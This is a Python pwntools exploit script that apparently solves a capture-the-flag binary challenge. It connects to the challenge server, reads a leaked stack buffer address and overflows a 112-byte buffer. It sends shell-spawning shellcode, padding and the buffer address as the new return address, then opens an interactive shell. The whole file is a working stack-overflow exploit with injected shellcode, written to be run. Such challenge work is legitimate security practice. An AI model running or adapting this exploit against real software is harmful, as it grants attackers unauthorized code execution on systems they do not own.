from pwn import *

EXE = ELF("./challenge/chall_3")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13373)
	return r

io = conn(False)
# Wait for the process to send "One more time" and respond to move onto vuln()
io.recvline()
io.send(b'a\n')

# Wait for the program to leak the address of the buffer we are writing to:
io.recvuntil("No really, it was pretty good before COVID: ")
data = io.recvline()[:-1]
buf_address = int(data, 16)

# Create a payload with an offset of 120 bytes then the address of the buffer send it, and open an 
# interactive terminal -- The system is 64-bit so we need a 64-bit pointer to the address of buf.
# This offset is 120 bytes because buf is 112 bytes, and the base pointer between the buffer and
# the return address is an additional 8 bytes (64-bit system)
payload = asm(shellcraft.sh())
payload += b'a'*(120-len(payload))
payload += p64(buf_address)+b'\n'
print(len(payload))
io.send(payload)
io.interactive()

io.close()